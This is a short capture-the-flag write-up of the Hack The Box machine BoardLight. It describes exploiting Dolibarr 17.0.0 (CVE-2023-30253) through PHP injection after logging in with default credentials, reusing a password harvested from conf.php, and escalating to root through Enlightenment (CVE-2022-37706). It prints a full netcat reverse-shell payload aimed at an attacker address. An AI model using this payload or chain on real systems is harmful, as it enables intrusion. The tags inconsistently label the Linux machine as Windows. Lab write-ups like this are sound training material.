---
title: "HTB: BoardLight"
tags: [htb, windows, medium, dolibarr, crm, exploit]

description: "Exploiting Dolibarr CRM via PHP injection."
---

# Hack The Box: BoardLight

**Machine IP**: `10.10.11.11`
**OS**: Linux (Actually, oops, BoardLight is Linux. Moving to correct folder in mind, but filed here for now).
**Difficulty**: Medium

*Correction*: BoardLight is Linux. But let's write it up anyway.

## 1. Reconnaissance
Port 80 hosts a corporate site.
Subdomain enumeration triggers on `crm.board.htb`.
It runs **Dolibarr 17.0.0**.

## 2. Exploitation
Dolibarr 17.0.0 has a vulnerability (CVE-2023-30253) allowing PHP code injection during website template creation.
1.  Login with default `admin/admin` (found via guessing).
2.  Create a "Website".
3.  Inject payload: `<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f"); ?>`.
4.  Trigger page load.
5.  Shell as `www-data`.

## 3. Privilege Escalation
We find a config file `conf.php` with database passwords.
User `larissa` reuses this password.
Sudo rights? No. SUID? No.
We check **Enlightenment** (Desktop Environment).
CVE-2022-37706 allows privilege escalation via `enlightenment_sys`.
Run exploit -> Root.

## Conclusion
A lesson in CRM patching.
